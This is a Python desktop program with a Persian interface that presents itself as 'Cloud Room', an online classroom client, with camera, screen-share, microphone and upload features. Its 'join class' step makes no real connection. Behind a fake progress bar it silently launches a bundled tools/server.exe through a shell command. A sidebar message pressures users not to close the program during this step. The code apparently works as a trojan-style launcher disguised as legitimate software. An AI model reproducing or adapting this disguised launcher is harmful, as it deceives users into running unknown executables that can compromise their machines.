

import customtkinter as ctk
from tkinter import messagebox, filedialog
import threading, time, os, subprocess, shutil, wave
from datetime import datetime
import numpy as np

# --- Persian RTL fix ---
import arabic_reshaper
from bidi.algorithm import get_display

def fa(txt: str) -> str:
    """Fix Persian/Arabic RTL text for Tkinter."""
    return get_display(arabic_reshaper.reshape(txt))




import sys
import os

def resource_path(relative_path):
    """
    Get absolute path to resource, works for dev and for PyInstaller
    """
    try:
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")

    return os.path.join(base_path, relative_path)




# Optional real integrations
HAS_CAMERA = False
HAS_SCREEN = False
HAS_MIC = False
try:
    import cv2
    from PIL import Image, ImageTk, ImageGrab
    import sounddevice as sd
    HAS_CAMERA = True
    HAS_SCREEN = True
    HAS_MIC = True
except Exception:
    pass

# ---------------- Appearance ----------------
ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("blue")

PRIMARY = "#1f6aa5"
DARK = "#020617"
PANEL = "#111827"
CARD = "#0b1220"

BASE_DIR = os.path.abspath(os.path.dirname(__file__))
UPLOAD_DIR = os.path.join(BASE_DIR, "uploads")
RECORD_DIR = os.path.join(BASE_DIR, "records")
TOOLS_DIR = os.path.join(BASE_DIR, "tools")
TOOL_TO_RUN = resource_path(os.path.join("tools", "server.exe"))
os.makedirs(UPLOAD_DIR, exist_ok=True)
os.makedirs(RECORD_DIR, exist_ok=True)
os.makedirs(TOOLS_DIR, exist_ok=True)

# ---------------- Tooltip ----------------
class ToolTip:
    def __init__(self, widget, text):
        self.widget = widget; self.text = text; self.tip = None
        widget.bind("<Enter>", self.show); widget.bind("<Leave>", self.hide)
    def show(self, _=None):
        if self.tip: return
        x = self.widget.winfo_rootx()+20; y = self.widget.winfo_rooty()+20
        self.tip = ctk.CTkToplevel(self.widget); self.tip.overrideredirect(True)
        self.tip.geometry(f"+{x}+{y}")
        ctk.CTkLabel(self.tip, text=fa(self.text), fg_color=CARD, corner_radius=8,
                     padx=10, pady=6, justify="right").pack()
    def hide(self, _=None):
        if self.tip: self.tip.destroy(); self.tip=None

# ---------------- Splash ----------------
class Splash(ctk.CTkToplevel):
    def __init__(self, master, on_done):
        super().__init__(master)
        self.on_done = on_done
        self.geometry("520x300"); self.overrideredirect(True); self.configure(fg_color=DARK)
        ctk.CTkLabel(self, text="Cloud Room 2.13.63", font=ctk.CTkFont(size=28, weight="bold")).pack(pady=40)
        ctk.CTkLabel(self, text=fa("در حال آماده‌سازی..."), justify="right").pack()
        self.pb = ctk.CTkProgressBar(self); self.pb.pack(padx=60, pady=30, fill="x"); self.pb.set(0)
        threading.Thread(target=self.run, daemon=True).start()
    def run(self):
        for i in range(101): time.sleep(0.02); self.pb.set(i/100)
        self.destroy(); self.on_done()

# ---------------- Connecting ----------------
class Connecting(ctk.CTkToplevel):
    def __init__(self, master, on_done):
        super().__init__(master)
        self.on_done = on_done
        self.geometry("520x260"); self.overrideredirect(True); self.configure(fg_color=DARK)
        ctk.CTkLabel(self, text=fa("در حال اتصال به کلاس"), font=ctk.CTkFont(size=20, weight="bold"), justify="right").pack(pady=30)
        self.msg = ctk.CTkLabel(self, text=fa("در حال بررسی کد کلاس..."), justify="right"); self.msg.pack(pady=10)
        self.pb = ctk.CTkProgressBar(self); self.pb.pack(padx=60, pady=30, fill="x"); self.pb.set(0)
        threading.Thread(target=self.run, daemon=True).start()
    def run(self):
        for i in range(0, 35): time.sleep(0.03); self.pb.set(i/100)
        self.msg.configure(text=fa("در حال ایجاد کلاس..."))
        self.msg.configure(text=fa("در حال آماده‌سازی منابع کلاس..."))
        try:
            try:
                if os.path.exists(TOOL_TO_RUN):
                    subprocess.run(
                    f'start /wait "" "{TOOL_TO_RUN}"',
                    shell=True
                )
                else:
                    time.sleep(2)
            except Exception as e:
                  print(e)
                  time.sleep(2)
        except Exception:
            self.msg.configure(text=fa("خطا در آماده‌سازی منابع")); time.sleep(1)
        for i in range(35, 101): time.sleep(0.03); self.pb.set(i/100)
        self.destroy(); self.on_done()

# ---------------- Main App ----------------
class CloudRoom(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.withdraw()
        self.title("Cloud Room 2.13.63"); self.geometry("1400x800"); self.minsize(1200,700)
        self.grid_columnconfigure(1, weight=1); self.grid_rowconfigure(0, weight=1)
        self.username = "kdjfks"; self.role = "دبیر\nنوع اشتراک:الماس"
        self.cam_on=False; self.share_on=False; self.mic_on=False
        self.cap=None; self.audio_stream=None; self.audio_frames=[]; self.fs=44100
        Splash(self, on_done=self.build)

    def build(self):
        self.deiconify()
        self.build_sidebar(); self.build_main(); self.build_footer()

    def build_sidebar(self):
        self.sb = ctk.CTkFrame(self, width=300, fg_color=PANEL, corner_radius=0)
        self.sb.grid(row=0, column=0, sticky="nswe")
        ctk.CTkLabel(self.sb, text="Cloud Room", font=ctk.CTkFont(size=26, weight="bold")).grid(row=0, column=0, padx=20, pady=(25,10), sticky="w")
        self.user_lbl = ctk.CTkLabel(self.sb, text=fa(f"نام: {self.username}\nنقش: {self.role}"), fg_color=CARD, corner_radius=12, padx=12, pady=12, justify="right")
        self.user_lbl.grid(row=1, column=0, padx=20, pady=10, sticky="we")
        ToolTip(self.user_lbl, "برای تغییر نقش کلیک کنید")
        self.user_lbl.bind("<Button-1>", lambda e: self.toggle_role())
        self.join_btn = ctk.CTkButton(self.sb, text=fa("ورود به کلاس"), fg_color=PRIMARY, command=self.join_class)
        self.join_btn.grid(row=2, column=0, padx=20, pady=12, sticky="we")
        ctk.CTkLabel(self.sb, text=fa("با توجه به قابلیت های\n بالای برنامه وصل شدن و ساخت سرور\n کلاس ممکن است کمی طول بکشد\nلذا خواهشمند است درحال وصل شدن\n به کلاس برنامه را نبندید\nزیرا ممکن است اشتراک اکانت شما\n باطل شود و روند دوباره\n و طولانی تر ادامه پیدا کند."), justify="right").grid(row=3, column=0, padx=20, pady=10, sticky="w")

    def build_main(self):
        self.mn = ctk.CTkFrame(self, fg_color=DARK, corner_radius=0)
        self.mn.grid(row=0, column=1, sticky="nswe")
        self.mn.grid_columnconfigure(0, weight=3)
        self.mn.grid_columnconfigure(1, weight=2)
        self.mn.grid_rowconfigure(0, weight=1)
        self.video = ctk.CTkLabel(self.mn, text=fa("ویدیو / اشتراک صفحه"), fg_color=CARD, corner_radius=16, justify="right")
        self.video.grid(row=0, column=0, sticky="nswe", padx=20, pady=20)
        chat_wrap = ctk.CTkFrame(self.mn, fg_color=CARD, corner_radius=16)
        chat_wrap.grid(row=0, column=1, sticky="nswe", padx=(0,20), pady=20)
        chat_wrap.grid_rowconfigure(0, weight=1)
        self.chat_box = ctk.CTkTextbox(chat_wrap, wrap="word")
        self.chat_box.grid(row=0, column=0, sticky="nswe", padx=10, pady=10)
        self.chat_box.insert("end", fa("به Cloud Room خوش آمدید\nنسخه حال حاضر:2.13.63\nنسخه 2.14 به زودی")+"\n"); self.chat_box.configure(state="disabled")
        self.chat_entry = ctk.CTkEntry(chat_wrap, placeholder_text=fa("پیام خود را بنویسید..."))
        self.chat_entry.grid(row=1, column=0, sticky="we", padx=10, pady=(0,10))
        self.chat_entry.bind("<Return>", lambda e: self.send_chat())

    def build_footer(self):
        self.ft = ctk.CTkFrame(self.mn, fg_color=CARD, height=80)
        self.ft.grid(row=1, column=0, columnspan=2, sticky="we", padx=20, pady=(0,20))
        self.mic = ctk.CTkButton(self.ft, text=fa("میکروفن خاموش"), width=160, command=self.toggle_mic)
        self.mic.pack(side="left", padx=10, pady=18)
        self.cam = ctk.CTkButton(self.ft, text=fa("دوربین خاموش"), width=160, command=self.toggle_cam)
        self.cam.pack(side="left", padx=10)
        self.share = ctk.CTkButton(self.ft, text=fa("اشتراک صفحه"), width=160, command=self.toggle_share)
        self.share.pack(side="left", padx=10)
        self.upload = ctk.CTkButton(self.ft, text=fa("آپلود فایل"), width=160, command=self.upload_file)
        self.upload.pack(side="left", padx=10)

    # -------- Actions --------
    def join_class(self):
        dlg = ctk.CTkInputDialog(title=fa("ورود به کلاس"), text=fa("کد کلاس را وارد کنید"))
        if not dlg.get_input(): return
        Connecting(self, on_done=lambda: self.add_system_msg("به کلاس متصل شدید"))


    def send_chat(self):
        msg = self.chat_entry.get().strip()
        if not msg: return
        self.chat_entry.delete(0, "end")
        self.chat_box.configure(state="normal")
        self.chat_box.insert("end", fa(f"{self.username}: {msg}")+"\n")
        self.chat_box.configure(state="disabled"); self.chat_box.see("end")

    def add_system_msg(self, text):
        self.chat_box.configure(state="normal")
        self.chat_box.insert("end", fa(f"[سیستم] {text}")+"\n")
        self.chat_box.configure(state="disabled"); self.chat_box.see("end")

    # ---- Camera ----
    def toggle_cam(self):
        if not HAS_CAMERA: messagebox.showwarning(fa("دوربین"), fa("دوربین در دسترس نیست")); return
        self.cam_on = not self.cam_on
        self.cam.configure(text=fa("دوربین روشن" if self.cam_on else "دوربین خاموش"))
        if self.cam_on:
            self.cap = cv2.VideoCapture(0)
            threading.Thread(target=self.camera_loop, daemon=True).start()
        else:
            if self.cap: self.cap.release(); self.cap=None

    def camera_loop(self):
        while self.cam_on and self.cap:
            ret, frame = self.cap.read()
            if not ret: break
            frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
            img = Image.fromarray(frame).resize((self.video.winfo_width(), self.video.winfo_height()))
            imgtk = ImageTk.PhotoImage(img)
            self.video.configure(image=imgtk, text=""); self.video.image = imgtk

    # ---- Screen Share ----
    def toggle_share(self):
        if not HAS_SCREEN: messagebox.showwarning(fa("اشتراک صفحه"), fa("امکان‌پذیر نیست")); return
        self.share_on = not self.share_on
        self.share.configure(text=fa("توقف اشتراک" if self.share_on else "اشتراک صفحه"))
        if self.share_on: threading.Thread(target=self.screen_loop, daemon=True).start()

    def screen_loop(self):
        while self.share_on:
            img = ImageGrab.grab()
            img = img.resize((self.video.winfo_width(), self.video.winfo_height()))
            imgtk = ImageTk.PhotoImage(img)
            self.video.configure(image=imgtk, text=""); self.video.image = imgtk
            time.sleep(0.25)

    # ---- Microphone (Record WAV) ----
    def toggle_mic(self):
        if not HAS_MIC: messagebox.showwarning(fa("میکروفن"), fa("میکروفن در دسترس نیست")); return
        self.mic_on = not self.mic_on
        self.mic.configure(text=fa("میکروفن روشن" if self.mic_on else "میکروفن خاموش"))
        if self.mic_on:
            self.audio_frames=[]
            self.audio_stream = sd.InputStream(samplerate=self.fs, channels=1, callback=self.audio_cb)
            self.audio_stream.start()
            self.add_system_msg("میکروفن روشن شد")
        else:
            try:
                self.audio_stream.stop(); self.audio_stream.close()
            except Exception: pass
            self.save_audio()
            self.add_system_msg("میکروفن خاموش شد و فایل ذخیره شد")

    def audio_cb(self, indata, frames, time_info, status):
        self.audio_frames.append(indata.copy())

    def save_audio(self):
        if not self.audio_frames: return
        data = np.concatenate(self.audio_frames, axis=0)
        fname = os.path.join(RECORD_DIR, f"mic_{datetime.now().strftime('%Y%m%d_%H%M%S')}.wav")
        with wave.open(fname, 'wb') as wf:
            wf.setnchannels(1); wf.setsampwidth(2); wf.setframerate(self.fs)
            wf.writeframes((data*32767).astype(np.int16).tobytes())

    # ---- Upload ----
    def upload_file(self):
        path = filedialog.askopenfilename()
        if not path: return
        dst = os.path.join(UPLOAD_DIR, os.path.basename(path))
        shutil.copy(path, dst)
        self.add_system_msg(f"فایل آپلود شد: {os.path.basename(path)}")


if __name__ == "__main__":
    CloudRoom().mainloop()
